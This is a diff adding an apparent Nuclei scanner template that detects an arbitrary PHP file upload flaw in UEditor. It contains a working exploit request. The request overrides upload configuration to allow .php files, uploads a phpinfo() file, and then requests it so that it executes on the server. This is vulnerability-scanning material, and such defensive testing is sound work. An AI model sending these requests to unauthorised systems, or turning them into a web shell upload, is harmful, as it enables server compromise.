@@ -1,0 +1,55 @@
+id: ueditor-php-arbitrary-file-upload
+info:
+  name: UEditor PHP Arbitrary File Upload
+  author: ChiragArtani
+  severity: critical
+  description: |
+    Detects arbitrary file upload vulnerability in UEditor PHP by attempting to upload and execute a PHP file.
+
+http:
+  - raw:
+      - |
+        POST /ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/aaaa&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=aaaa HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Content-Length: 222
+        Cache-Control: max-age=0
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+        
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="aaaa"; filename="aaaa.php"
+        Content-Type: application/octet-stream
+        
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /ueditor/php/upload/aaaa.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36
+        Accept: text/html
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        part: body
+      - type: regex
+        regex:
+          - "<title>phpinfo\\(\\)</title>"
+        part: body
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/ueditor/php/upload/aaaa\\.php"
